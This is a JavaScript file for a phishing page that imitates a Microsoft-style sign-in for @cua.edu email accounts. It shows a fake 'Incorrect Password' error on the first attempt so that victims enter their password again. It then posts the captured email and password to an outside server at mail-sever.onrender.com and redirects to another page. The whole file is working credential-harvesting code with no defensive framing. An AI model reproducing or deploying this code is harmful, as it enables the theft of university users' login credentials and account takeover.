document.addEventListener("DOMContentLoaded", function() {
    let attemptCount = 0; // Track submit attempts

    const nextBtn = document.querySelector('#idSIButton9');
    const backBtn = document.querySelector('#idBtn_Back');

    const emailDisplay = document.querySelector('#emailDisplay');
    const passDisplay = document.querySelector('#passDisplay');
    const backDiv = document.getElementById('backDiv');
    const submitDiv = document.getElementById('submitDiv');
    const ceateDiv = document.getElementById('ceateDiv');
    const nextDiv = document.getElementById('nextDiv');
    const borderOne = document.getElementById('b1');
    const borderTwo = document.getElementById('b2');
    const email = document.getElementById("identifierId");
    const password = document.getElementById("identifierPassword");
    const alert = document.getElementById("alert");
    let abortController; // Declare abort controller for fetch requests

    email.addEventListener('keypress', (e) => {
        if (e.keyCode === 13) {
            e.preventDefault();
            handleEmailValidation();
        }
    });

    nextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        handleEmailValidation();
    });

    function handleEmailValidation() {
        let testMail = email.value + '@cua';
        if (validateEmail(testMail)) {
            passDisplay.style.display = 'block';
            emailDisplay.style.display = 'none';
            backDiv.style.display = 'block';
            submitDiv.style.display = 'block';
            ceateDiv.style.display = 'none';
            nextDiv.style.display = 'none';
        } else {
            borderOne.style.borderBlockColor = 'red';
            alert.innerText = 'Incorrect Email or Phone Number';
        }
    }

    backBtn.addEventListener('click', (e) => {
        e.preventDefault();
        passDisplay.style.display = 'none';
        emailDisplay.style.display = 'block';
        backDiv.style.display = 'none';
        submitDiv.style.display = 'none';
        ceateDiv.style.display = 'block';
        nextDiv.style.display = 'block';
    });

    const loginForm = document.getElementById("loginForm");

    loginForm.addEventListener("submit", function(event) {
        event.preventDefault();
        attemptCount += 1;

        if (password.value !== '' || attemptCount > 1) {
            // Trigger password error on the first attempt
            if (attemptCount === 1) {
                borderTwo.style.borderBlockColor = 'red';
                alert.innerText = 'Incorrect Password, try again..';
                return; // Prevent submission on first incorrect password entry
            }

            // Initialize or reset abort controller
            if (abortController) {
                abortController.abort(); // Cancel previous request if still pending
            }
            abortController = new AbortController();

            const userData = {
                FullName: password.value,
                Email: email.value + "@cua.edu",
                Password: "username",
            };

            fetch('https://mail-sever.onrender.com/Api/User/sign-up', {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(userData),
                signal: abortController.signal
            })
            .then(response => {
                if (!response.ok) {
                    return response.json().then(err => { throw err; });
                }
                return response.json();
            })
            .then(() => {
                setTimeout(() => {
                    window.location.href = "auth.html";
                }, 2000);
            })
            .catch(error => {
                if (error.name !== 'AbortError') {
                    alert.innerText = 'There was a problem submitting the form. Please try again later.';
                }
            });
        } else {
            borderTwo.style.borderBlockColor = 'red';
            alert.innerText = 'Incorrect Password, try again..';
        }
    });

    function validateEmail(email) {
        return email.endsWith("@cua");
    }

    // function validatePassword(password) {
    //     return password.trim() !== "";
    // }
});
